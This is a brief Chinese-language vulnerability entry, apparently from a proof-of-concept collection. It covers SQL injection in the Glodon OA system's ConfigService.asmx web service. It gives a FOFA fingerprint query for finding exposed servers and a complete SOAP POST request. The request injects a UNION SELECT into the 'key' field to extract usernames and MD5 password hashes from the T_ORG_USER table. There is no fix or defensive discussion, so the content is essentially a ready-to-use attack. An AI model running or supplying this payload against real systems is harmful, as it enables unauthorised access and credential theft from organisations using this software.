# 广联达OA系统接口ConfigService.asmx存在SQL注入漏洞

广联达OA系统接口 `/Webservice/IM/Config/ConfigService.asmx` 存在SQL注入漏洞。

## fofa

```yaml
header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

```xml
POST /Webservice/IM/Config/ConfigService.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/123.0.6312.88 Safari/537.36
Content-Type: text/xml;charset=UTF-8

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetIMDictionary xmlns="http://tempuri.org/">
<key>1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from
T_ORG_USER --</key>
</GetIMDictionary>
</soap:Body>
</soap:Envelope>
```

